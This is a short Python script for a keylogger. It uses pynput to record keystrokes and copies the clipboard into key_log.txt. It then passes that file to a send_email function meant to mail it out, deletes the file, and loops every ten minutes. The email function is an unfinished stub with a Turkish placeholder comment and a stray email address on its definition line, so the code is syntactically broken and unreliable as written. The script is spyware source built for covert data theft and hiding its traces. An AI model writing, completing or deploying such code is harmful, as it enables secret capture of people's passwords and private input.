import clipboard
import smtplib
import os
import time
from pynput import keyboard

keys = []

def on_press(key):
    try:
        current = key.char
    except AttributeError:
        if key == key.space:
            keys.append("space")
        else:
            keys.append("special key {0}".format(key))
    else:
        keys.append(key.char)

def on_release(key):
    if key == keyboard.Key.esc:
        with open("key_log.txt", "a") as f:
            f.write("\n\n")
            f.write("Keyboard Input:\n")
            for key in keys:
                f.write(key)
            f.write("\n\n")
            f.write("Clipboard Content:\n")
            f.write(clipboard.paste())
        
        send_email("key_log.txt")
        os.remove("key_log.txt")

        return False

def send_email(file_path): vcontra6@gmail.com
    # email gönderme kodunuzu buraya ekleyin
    pass

while True:
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
    time.sleep(600)
